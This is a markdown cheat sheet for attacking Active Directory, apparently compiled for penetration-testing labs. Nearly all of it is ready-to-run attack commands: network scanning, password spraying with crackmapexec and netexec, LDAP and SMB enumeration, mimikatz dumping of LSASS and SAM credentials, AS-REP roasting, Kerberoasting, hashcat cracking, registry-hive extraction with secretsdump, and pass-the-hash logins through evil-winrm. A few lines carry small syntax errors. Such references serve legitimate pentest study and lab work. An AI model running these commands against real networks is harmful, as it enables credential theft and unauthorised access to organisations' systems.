# AD-Onepage

# External
## Scanning all accessible targets externally
```
nmap -A -p- -Pn <ip> -oN nmap-name.txt
```

Check what systems user can login to (pwn3d = local admin)
```
crackmapexec smb 192.168.50.75 -u pete -p 'Nexus123!' -d corp.com --continue-on-success
```

## SMB
```
crackmapexec smb 192.168.50.75 -u pete -p 'Nexus123!' -d corp.com  ---shares
crackmapexec smb 192.168.50.75 -u pete -p 'Nexus123!' --shares
Nxc smb <ip> -u '' ip ''
```

## LDAP
//try null (no user/password) [//wiki](https://www.netexec.wiki/ldap-protocol/query-ldap)
```
Nxc ldap <ip> -u '' ip '' 
Nxc ldap <ip> -u '' ip '' -M get-desc-users
Ldapsearch -x -H ldap://<DC IP>:389 -b"DC=<>,DC=<>" |grep -I 'password'
Nxc ldap <dc> -u users.txt -p <password> --continue-on-success
```
# Internal
## Credential dumps
mimikatz - elevate privilidges
```
privilege::debug
token::elevate
```
then try dump credentials
```
sekurlsa::logonpasswords //lsass
lsadump::sam
lsadump::lsa
lsadump::cache
lsadump::secrets
```


## AS-Rep Roasting

from kali
```
impacket-GetNPUsers -no-pass -usersfile unames.txt EGOTISTICAL-BANK.LOCAL/
```
on Windows
```
./Rubeus.exe asreproast![image](https://github.com/user-attachments/assets/d5af009d-339e-40b4-a216-4b271a3c396b)

```
crack as-rep hashes
```
Sudo hashcat -m 18200 hashes.asreproast <wordlist> -r /usr/share/hashcat/rules/best64.rule --force
```


## Kerberoasting
on kali
```
impacket-GetUserSPNs -request –dc-ip <domain controller address> corp.com/user
impacket-GetUserSPNs active.htb\SVC_TGS -request 

```
on Windows
```
.\Rubeus.exe kerberoast /nowrap
```
Crack with hashcat
```
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

## SAM Registry keys in windows
```
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```
Then in kali
```
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
OR extract hash 
```
impacket-secretsdump -sam SAM -system SYSTEM local
```
And try to authenticate with hash
```
evil-winrm -I <ip> -u user -H hash
```
or crack the hashes
```
 sudo hashcat -m 1000 5d41402abc4b2a76b9719d911017c592 /usr/share/wordlists/rockyou.txt
```
## Impacket

*SecretsDump

attempt to remotely dump secrets from target windows machine (Credentials required)
```
impacket-secretsdump USER@IP -hashes :hash
impacket-secretsdump USER@IP 
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```
 

